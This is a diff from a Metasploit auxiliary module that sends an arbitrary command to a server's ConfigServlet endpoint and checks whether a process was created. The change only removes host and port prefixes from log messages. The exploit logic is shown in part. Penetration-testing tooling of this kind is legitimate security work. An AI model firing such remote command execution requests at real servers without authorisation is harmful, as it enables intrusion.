@@ -45,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     begin
-      print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
+      print_status("Sending remote command: " + datastore['CMD'])
       uri = normalize_uri(target_uri.path, 'ConfigServlet')
 
       res = send_request_cgi(
@@ -56,21 +56,21 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
       if !res || (res.code != 200)
-        print_error("#{rhost}:#{rport} - Exploit failed")
+        print_error("Exploit failed")
         return
       end
     rescue ::Rex::ConnectionError
-      print_error("#{rhost}:#{rport} - Failed to connect to the server")
+      print_error("Failed to connect to the server")
       return
     end
 
     if res.body.include?('Process created')
-      print_good("#{rhost}:#{rport} - Exploited successfully\n")
-      print_line("#{rhost}:#{rport} - Command: #{datastore['CMD']}\n")
-      print_line("#{rhost}:#{rport} - Output: #{res.body}")
+      print_good("Exploited successfully\n")
+      print_line("Command: #{datastore['CMD']}\n")
+      print_line("Output: #{res.body}")
     else
-      print_error("#{rhost}:#{rport} - Exploit failed")
-      vprint_error("#{rhost}:#{rport} - Output: #{res.body}")
+      print_error("Exploit failed")
+      vprint_error("Output: #{res.body}")
     end
   end
 end
